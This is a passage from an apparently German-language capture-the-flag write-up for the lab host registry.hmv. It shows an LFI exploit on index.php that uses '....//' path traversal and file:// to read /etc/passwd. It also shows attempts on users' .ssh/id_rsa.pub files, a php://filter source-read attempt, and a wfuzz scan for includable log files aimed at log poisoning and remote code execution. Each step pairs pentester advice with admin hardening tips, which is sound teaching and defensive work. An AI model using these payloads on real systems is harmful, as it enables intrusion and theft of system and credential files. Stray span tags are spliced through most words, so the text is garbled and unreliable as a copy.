<span class="command">b<span class="command">i</span>n:x:2:2:b<span class="command">i</span>n:/b<span class="command">i</span>n:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">s</span>y<span class="command">s</span>:x:3:3:<span class="command">s</span>y<span class="command">s</span>:/de<span class="command">v</span>:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n
<span class="command">s</span>yn<span class="command">c</span>:x:4:65534:<span class="command">s</span>yn<span class="command">c</span>:/b<span class="command">i</span>n:/b<span class="command">i</span>n/<span class="command">s</span>yn<span class="command">c</span>
<span class="command">g<span class="command">a</span><span class="command">m</span>e<span class="command">s</span>:x:5:6<span class="command">0</span>:g<span class="command">a</span><span class="command">m</span>e<span class="command">s</span>:/u<span class="command">s</span>r/g<span class="command">a</span><span class="command">m</span>e<span class="command">s</span>:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">m<span class="command">a</span>n:x:6:12:m<span class="command">a</span>n:/<span class="command">v</span><span class="command">a</span>r/<span class="command">c</span><span class="command">a</span><span class="command">c</span>he/m<span class="command">a</span>n:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">lp:x:7:7:lp:/<span class="command">v</span><span class="command">a</span>r/<span class="command">s</span>p<span class="command">o</span><span class="command">o</span>l/lpd:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">m<span class="command">a</span><span class="command">i</span>l:x:8:8:m<span class="command">a</span><span class="command">i</span>l:/<span class="command">v</span><span class="command">a</span>r/m<span class="command">a</span><span class="command">i</span>l:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">news:x:9:9:news:/<span class="command">v</span><span class="command">a</span>r/<span class="command">s</span>p<span class="command">o</span><span class="command">o</span>l/news:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">u<span class="command">u</span><span class="command">c</span>p:x:1<span class="command">0</span>:1<span class="command">0</span>:u<span class="command">u</span><span class="command">c</span>p:/<span class="command">v</span><span class="command">a</span>r/<span class="command">s</span>p<span class="command">o</span><span class="command">o</span>l/u<span class="command">u</span><span class="command">c</span>p:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">pr<span class="command">o</span>xy:x:13:13:pr<span class="command">o</span>xy:/b<span class="command">i</span>n:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">www-d<span class="command">a</span>t<span class="command">a</span>:x:33:33:www-d<span class="command">a</span>t<span class="command">a</span>:/<span class="command">v</span><span class="command">a</span>r/www:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">b<span class="command">a</span><span class="command">c</span>k<span class="command">u</span>p:x:34:34:b<span class="command">a</span><span class="command">c</span>k<span class="command">u</span>p:/<span class="command">v</span><span class="command">a</span>r/b<span class="command">a</span><span class="command">c</span>k<span class="command">u</span>p<span class="command">s</span>:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">l<span class="command">i</span><span class="command">s</span>t:x:38:38:M<span class="command">a</span><span class="command">i</span>l<span class="command">i</span>ng L<span class="command">i</span><span class="command">s</span>t M<span class="command">a</span>n<span class="command">a</span>ger:/<span class="command">v</span><span class="command">a</span>r/l<span class="command">i</span><span class="command">s</span>t:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">i</span>r<span class="command">c</span>:x:39:39:<span class="command">i</span>r<span class="command">c</span>d:/r<span class="command">u</span>n/<span class="command">i</span>r<span class="command">c</span>d:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n
<span class="command">gn<span class="command">a</span>t<span class="command">s</span>:x:41:41:Gn<span class="command">a</span>t<span class="command">s</span> B<span class="command">u</span>g-Rep<span class="command">o</span>rt<span class="command">i</span>ng <span class="command">S</span>y<span class="command">s</span>te<span class="command">m</span> (<span class="command">a</span>dm<span class="command">i</span>n):/<span class="command">v</span><span class="command">a</span>r/l<span class="command">i</span>b/gn<span class="command">a</span>t<span class="command">s</span>:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">n<span class="command">o</span>b<span class="command">o</span>dy:x:65534:65534:n<span class="command">o</span>b<span class="command">o</span>dy:/n<span class="command">o</span>nex<span class="command">i</span><span class="command">s</span>tent:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">_a<span class="command">p</span>t:x:1<span class="command">0</span><span class="command">0</span>:65534::/n<span class="command">o</span>nex<span class="command">i</span><span class="command">s</span>tent:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d-netw<span class="command">o</span>rk:x:1<span class="command">0</span>1:1<span class="command">0</span>2:<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d Netw<span class="command">o</span>rk M<span class="command">a</span>n<span class="command">a</span>ge<span class="command">m</span>ent,,,:/r<span class="command">u</span>n/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n
<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d-re<span class="command">s<span class="command">o</span>l<span class="command">v</span>e:x:1<span class="command">0</span>2:1<span class="command">0</span>3:<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d Re<span class="command">s<span class="command">o</span>l<span class="command">v</span>er,,,:/r<span class="command">u</span>n/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">m<span class="command">e<span class="command">ss</span><span class="command">a</span>gebu<span class="command">s</span>:x:1<span class="command">0</span>3:1<span class="command">0</span>4::/n<span class="command">o</span>nex<span class="command">i</span><span class="command">s</span>tent:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span></span>
<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d-t<span class="command">i</span><span class="command">m</span>e<span class="command">s</span>yn<span class="command">c</span>:x:1<span class="command">0</span>4:1<span class="command">0</span>5:<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d T<span class="command">i</span><span class="command">m</span>e <span class="command">S</span>yn<span class="command">c</span>hr<span class="command">o</span>niz<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n,,,:/r<span class="command">u</span>n/<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>d:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n
<span class="command">p<span class="command">o</span>ll<span class="command">i</span>n<span class="command">a</span>te:x:1<span class="command">0</span>5:1::/<span class="command">v</span><span class="command">a</span>r/<span class="command">c</span><span class="command">a</span><span class="command">c</span>he/p<span class="command">o</span>ll<span class="command">i</span>n<span class="command">a</span>te:/b<span class="command">i</span>n/f<span class="command">a</span>l<span class="command">s</span>e</span>
<span class="command">s<span class="command">s</span>hd:x:1<span class="command">0</span>6:65534::/r<span class="command">u</span>n/<span class="command">s</span><span class="command">s</span>hd:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">u<span class="command">s</span>bm<span class="command">u</span>x:x:1<span class="command">0</span>7:46:u<span class="command">s</span>bm<span class="command">u</span>x d<span class="command">a</span>e<span class="command">m<span class="command">o</span>n,,,:/<span class="command">v</span><span class="command">a</span>r/l<span class="command">i</span>b/u<span class="command">s</span>bm<span class="command">u</span>x:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span></span>
<span class="command">g<span class="command">a</span>t<span class="command">o</span>:x:1<span class="command">0</span><span class="command">0</span><span class="command">0</span>:1<span class="command">0</span><span class="command">0</span><span class="command">0</span>:g<span class="command">a</span>t<span class="command">o</span>:/h<span class="command">o</span><span class="command">m</span>e/g<span class="command">a</span>t<span class="command">o</span>:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">u<span class="command">u</span><span class="command">i</span>dd:x:1<span class="command">0</span>8:112::/r<span class="command">u</span>n/u<span class="command">u</span><span class="command">i</span>dd:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">u<span class="command">s</span>er:x:1<span class="command">0</span><span class="command">0</span>1:1<span class="command">0</span><span class="command">0</span>1::/h<span class="command">o</span><span class="command">m</span>e/u<span class="command">s</span>er:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">c</span>xdxnt:x:1<span class="command">0</span><span class="command">0</span>2:1<span class="command">0</span><span class="command">0</span>2::/h<span class="command">o</span><span class="command">m</span>e/<span class="command">c</span>xdxnt:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um die Benutzerkonten mit einer interaktiven Shell (`/bin/bash`) von den Systemkonten zu unterscheiden, filtere ich die `/etc/passwd`-Ausgabe mit `grep sh`. Der `sh`-Eintrag am Ende einer Zeile in `/etc/passwd` zeigt an, dass der Benutzer eine Shell hat, typischerweise `/bin/bash` oder `/bin/sh`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die gefilterte Ausgabe listet die Benutzer `root`, `www-data`, `gato`, `user` und `cxdxnt` als Benutzer mit einer interaktiven Shell auf. Dies sind die primären Benutzerkonten, auf die ich mich für Privilege Escalation-Versuche konzentrieren sollte. Das `sshd` Konto hat auch `/usr/sbin/nologin`, was bedeutet, dass es sich nicht interaktiv anmelden kann.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Filtere `/etc/passwd` nach Benutzern mit interaktiven Shells, um potenzielle Ziele für Brute-Force, Passwort-Wiederverwendung oder Key-basierte Angriffe zu identifizieren.
                <br>**Empfehlung (Admin):** Weise Systemkonten (`www-data`, `sshd` etc.) `nologin` Shells zu, wenn sie keine interaktive Anmeldung benötigen, um das Risiko zu reduzieren. Stelle sicher, dass nur notwendige Benutzerkonten mit interaktiven Shells existieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd -<span class="command">s</span>|<span class="command">g</span>rep <span class="command">s</span>h</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">r<span class="command">o</span><span class="command">o</span>t:x:<span class="command">0</span>:<span class="command">0</span>:r<span class="command">o</span><span class="command">o</span>t:/r<span class="command">o</span><span class="command">o</span>t:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">www-d<span class="command">a</span>t<span class="command">a</span>:x:33:33:www-d<span class="command">a</span>t<span class="command">a</span>:/<span class="command">v</span><span class="command">a</span>r/www:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">s<span class="command">s</span>hd:x:1<span class="command">0</span>6:65534::/r<span class="command">u</span>n/<span class="command">s</span><span class="command">s</span>hd:/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/n<span class="command">o</span>l<span class="command">o</span>g<span class="command">i</span>n</span>
<span class="command">g<span class="command">a</span>t<span class="command">o</span>:x:1<span class="command">0</span><span class="command">0</span><span class="command">0</span>:1<span class="command">0</span><span class="command">0</span><span class="command">0</span>:g<span class="command">a</span>t<span class="command">o</span>:/h<span class="command">o</span><span class="command">m</span>e/g<span class="command">a</span>t<span class="command">o</span>:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">u<span class="command">s</span>er:x:1<span class="command">0</span><span class="command">0</span>1:1<span class="command">0</span><span class="command">0</span>1::/h<span class="command">o</span><span class="command">m</span>e/u<span class="command">s</span>er:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</span>
<span class="command">c</span>xdxnt:x:1<span class="command">0</span><span class="command">0</span>2:1<span class="command">0</span><span class="command">0</span>2::/h<span class="command">o</span><span class="command">m</span>e/<span class="command">c</span>xdxnt:/b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit der LFI-Schwachstelle versuche ich, die öffentlichen SSH-Schlüssel (`id_rsa.pub`) der identifizierten Benutzer (`gato`, `user`, `cxdxnt`) aus ihren Home-Verzeichnissen (`/home/<user>/.ssh/`) zu lesen. Öffentliche Schlüssel sind oft über das Web lesbar und können Hinweise auf private Schlüssel geben, oder das Vorhandensein eines Schlüssels kann für weitere Angriffe relevant sein. Ich verwende die `file://` LFI-Payload-Struktur mit der entsprechenden Anzahl von `../` und den Pfad zur `.ssh/id_rsa.pub` Datei für jeden Benutzer.
            </p>
            <p class="evaluation">
                **Bewertung:** Keiner der Versuche, die öffentlichen SSH-Schlüssel zu lesen, liefert eine Ausgabe ("keine ausgabe auch nicht bei id_rsa"). Dies bedeutet, dass diese Dateien entweder nicht existieren, nicht lesbar sind (was bei `.ssh` Dateien Standard sein sollte, aber LFI läuft als `www-data`, der eingeschränkte Rechte hat), oder durch die LFI-Schwachstelle nicht inkludiert werden können (z.B. wegen Blockierung von versteckten Dateien). Dies ist eine Sackgasse für diesen spezifischen Ansatz der PE.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn der Versuch fehlschlägt, private/öffentliche Schlüssel über LFI zu lesen, schließe nicht sofort aus, dass sie existieren. Es kann an Berechtigungen oder Filtern liegen. Probiere, andere Dateien im selben Verzeichnis zu lesen oder andere PE-Vektoren zu verfolgen.
                <br>**Empfehlung (Admin):** Stelle sicher, dass `.ssh`-Verzeichnisse und deren Inhalte restriktive Dateiberechtigungen haben (`chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/*`). Konfiguriere Webserver so, dass sie Anfragen an versteckte Dateien (beginnend mit einem Punkt) in Home-Verzeichnissen blockieren.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///h<span class="command">o</span><span class="command">m</span>e//g<span class="command">a</span>t<span class="command">o</span>//.<span class="command">s</span><span class="command">s</span>h/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.p<span class="command">u</span>b</span>
<span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///h<span class="command">o</span><span class="command">m</span>e//u<span class="command">s</span>er//.<span class="command">s</span><span class="command">s</span>h/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.p<span class="command">u</span>b</span>
<span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///h<span class="command">o</span><span class="command">m</span>e//<span class="command">c</span>xdxnt//.<span class="command">s</span><span class="command">s</span>h/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.p<span class="command">u</span>b</span>

keine <span class="command">a</span>u<span class="command">s</span>g<span class="command">a</span>be <span class="command">a</span>u<span class="command">c</span>h n<span class="command">i</span><span class="command">c</span>ht be<span class="command">i</span> <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste den `php://filter` Wrapper mit Base64-Kodierung, um den Quellcode von `index.php` selbst zu lesen. Dies ist eine gängige Technik, um den Quellcode von Dateien zu erhalten, die LFI-Schwachstellen haben, wenn die direkte Inklusion nicht funktioniert oder die Ausgabe im Browser unsauber ist. Die URL lautet `http://registry.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php`.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Versuch, den Quellcode von `index.php` mit `php://filter` zu lesen, liefert keine Ausgabe. Dies kann verschiedene Gründe haben: Der Wrapper ist blockiert, die Datei ist leer, oder es gibt ein anderes Problem mit der Inklusion. Dies ist eine weitere Sackgasse für diesen spezifischen LFI-Ausnutzungsversuch.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn direkte LFI nicht zum Lesen von Quellcode führt, versuche Wrapper wie `php://filter` oder `php://data`. Sei dir bewusst, dass auch Wrapper blockiert sein können.
                <br>**Empfehlung (Admin):** Deaktiviere potenziell gefährliche PHP-Wrapper (`allow_url_include=Off`, `allow_url_fopen=Off` in `php.ini`), wenn sie nicht benötigt werden. Implementiere eine WAF, die Versuche, solche Wrapper auszunutzen, erkennt und blockiert.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">view-source:http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=php://f<span class="command">i</span>lter/<span class="command">c</span><span class="command">o</span>n<span class="command">v</span>ert.b<span class="command">a</span><span class="command">s</span>e64-en<span class="command">c</span><span class="command">o</span>de/re<span class="command">s</span><span class="command">o</span>ur<span class="command">c</span>e=index.php</span>
keine <span class="command">a</span>u<span class="command">s</span>g<span class="command">a</span>be</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um das Potenzial der LFI-Schwachstelle weiter auszuloten und potenziell eine Remote Code Execution (RCE) zu erreichen, nutze ich das Tool `wfuzz` für einen kombinierten LFI- und Log-Poisoning-Test. Ich verwende eine Wortliste, die gängige Log-Dateipfade enthält (`/usr/share/wordlists/logfiles.txt`), und verwende diese als `FUZZ` Payload in der LFI-URL: `http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....//FUZZ`. Ich schließe 404-Fehler und Antworten mit 0 Chars Header-Länge aus (`--hc 404 --hh 0`). Das Ziel ist, Log-Dateien zu finden, die ich über LFI inkludieren kann. Wenn ich Schreibzugriff auf eine dieser Log-Dateien habe, könnte ich PHP-Code dort einschleusen (Log Poisoning) und diesen Code dann über LFI ausführen lassen.
            </p>
            <p class="evaluation">
                **Bewertung:** Wfuzz findet zahlreiche Log-Dateien, die über LFI erfolgreich inkludiert werden können (Status 200). Dazu gehören `/etc/passwd` (was ich bereits manuell gefunden hatte), verschiedene `/proc/` Dateien, `/var/log/dpkg.log`, `/var/log/lastlog`, `/var/log/faillog`, `/var/log/wtmp`, `/var/run/utmp`, Apache-Konfigurationsdateien und vor allem die Apache-Log-Dateien: `/var/log/apache2/error.log` und `/var/log/apache2/access.log`. Das Finden der Apache-Log-Dateien, auf die der Webserver schreibt, ist **entscheidend** für einen Log-Poisoning-Angriff. Wenn ich meinen PHP-Payload in eine dieser Dateien schreiben kann, kann ich ihn über die LFI-Schwachstelle ausführen lassen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze Tools wie Wfuzz mit Wortlisten, um LFI-Schwachstellen systematisch zu prüfen und inkludierbare Dateien zu finden. Priorisiere Log-Dateien, Konfigurationsdateien oder Dateien, die von Benutzern kontrolliert werden könnten.
                <br>**Empfehlung (Admin):** Stelle sicher, dass Webserver-Log-Dateien nicht für den Webserver-Benutzer lesbar sind. Überwache Webserver-Logs auf Anzeichen von LFI-Scans (z.B. viele Anfragen an `index.php` mit Dateipfaden als Parameter).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# wfuzz -c -w /usr/share/wordlists/logfiles.txt -u "http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....//FUZZ"  --hc 404 --hh 0</div>
                </div>
                <div class="terminal">
                    <pre>===============================================================
Wfuzz v2.4.5
<span class="password">---------------------------------------------------------------</span>
ID           Re<span class="command">s</span>p<span class="command">o</span>n<span class="command">s</span>e   L<span class="command">i</span>ne<span class="command">s</span>    W<span class="command">o</span>rd       <span class="command">C</span>h<span class="command">a</span>r<span class="command">s</span>       P<span class="command">a</span>yl<span class="command">o</span><span class="command">a</span>d
<span class="password">===============================================================</span>

<span class="command">000000001:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000000025:   200        10 L     57 W       411 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>.<span class="command">a</span>ll<span class="command">o</span>w"</span>
<span class="command">000000024:   200        9 L      25 W       223 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000000018:   200        12 L     90 W       657 Ch      "/et<span class="command">c</span>/f<span class="command">s</span>t<span class="command">a</span>b"</span>
<span class="command">000000005:   200        227 L    1115 W     7224 Ch     "/et<span class="command">c</span>/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2.<span class="command">c</span><span class="command">o</span>nf"</span>
<span class="command">000000026:   200        17 L     111 W      711 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>.deny"</span>
<span class="command">000000070:   200        27 L     97 W       582 Ch      "/et<span class="command">c</span>/pr<span class="command">o</span>f<span class="command">i</span>le"</span>
<span class="command">000000055:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000000047:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000000045:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000000053:   200        2 L      12 W       91 Ch       "/et<span class="command">c</span>/netw<span class="command">o</span>rk<span class="command">s</span>"</span>
<span class="command">000000048:   200        25 L     150 W      1833 Ch     "/et<span class="command">c</span>/<span class="command">m<span class="command">t<span class="command">a</span>b"</span></span>
<span class="command">000000044:   200        4 L      6 W        104 Ch      "/et<span class="command">c</span>/l<span class="command">s</span>b-rele<span class="command">a</span><span class="command">s</span>e"</span>
<span class="command">000000038:   200        10 L     41 W       396 Ch      "/et<span class="command">c</span>/i<span class="command">s</span><span class="command">s</span>ue"</span>
<span class="command">000000086:   200        1 L      3 W        603 Ch      "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>h_h<span class="command">o</span><span class="command">s</span>t_d<span class="command">s</span><span class="command">a</span>_key.p<span class="command">u</span>b"</span>
<span class="command">000000084:   200        122 L    387 W      3237 Ch     "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>hd_<span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g"</span>
<span class="command">000000080:   200        23 L     142 W      931 Ch      "/et<span class="command">c</span>/re<span class="command">s<span class="command">o</span>l<span class="command">v</span>.conf"</span></span>
<span class="command">000000083:   200        53 L     220 W      1650 Ch     "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>h_<span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g"</span>
<span class="command">000000109:   200        71 L     426 W      3685 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">m<span class="command">o</span>d<span class="command">u</span>le<span class="command">s</span>"</span></span>
<span class="command">000000105:   200        32 L     57 W       385 Ch      "/pr<span class="command">o</span><span class="command">c</span>/file<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span><span class="command">s</span>"</span>
<span class="command">000000108:   200        50 L     146 W      1391 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">m<span class="command">e<span class="command">m</span><span class="command">i</span>nf<span class="command">o</span>"</span></span>
<span class="command">000000113:   200        1 L      23 W       186 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">v</span>er<span class="command">s</span>i<span class="command">o</span>n"</span>
<span class="command">000000107:   200        53 L     173 W      1338 Ch     "/pr<span class="command">o</span><span class="command">c</span>/i<span class="command">o</span>p<span class="command">o</span>rt<span class="command">s</span>"</span>
<span class="command">000000112:   200        2 L      10 W       100 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>w<span class="command">a</span>p<span class="command">s</span>"</span>
<span class="command">000000110:   200        25 L     150 W      1833 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">m<span class="command">o</span>unt<span class="command">s</span>"</span></span>
<span class="command">000000111:   200        10 L     497 W      1183 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>t<span class="command">a</span>t"</span>
<span class="command">000000114:   200        4 L      27 W       316 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/net/<span class="command">a</span>rp"</span>
<span class="command">000000104:   200        56 L     358 W      2036 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">c</span>p<span class="command">u</span><span class="command">i</span>nf<span class="command">o</span>"</span>
<span class="command">000000106:   200        32 L     180 W      1733 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">i</span>nterr<span class="command">u</span>pt<span class="command">s</span>"</span>
<span class="command">000000181:   200        9695 L   57650 W    684662 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/dpkg.l<span class="command">o</span>g"</span>
<span class="command">000000199:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000000188:   200        0 L      1 W        32096 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/f<span class="command">a</span><span class="command">i</span>ll<span class="command">o</span>g"</span>
<span class="command">000000224:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000004866:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000005079:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000005081:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000005080:   200        9 L      25 W       223 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000005075:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000005060:   200        57 L     139 W      1380 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>tu<span class="command">s</span>"</span>
<span class="command">000005059:   200        1 L      52 W       323 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>t"</span>
<span class="command">000005058:   200        0 L      1 W        27 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000005088:   200        1 L      3 W        80 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000005082:   200        10 L     41 W       396 Ch      "/et<span class="command">c</span>/i<span class="command">s</span><span class="command">s</span>ue"</span>
<span class="command">000005095:   200        227 L    1115 W     7224 Ch     "/et<span class="command">c</span>/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2.<span class="command">c</span><span class="command">o</span>nf"</span>
<span class="command">000005109:   200        122 L    387 W      3237 Ch     "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>hd_<span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g"</span>
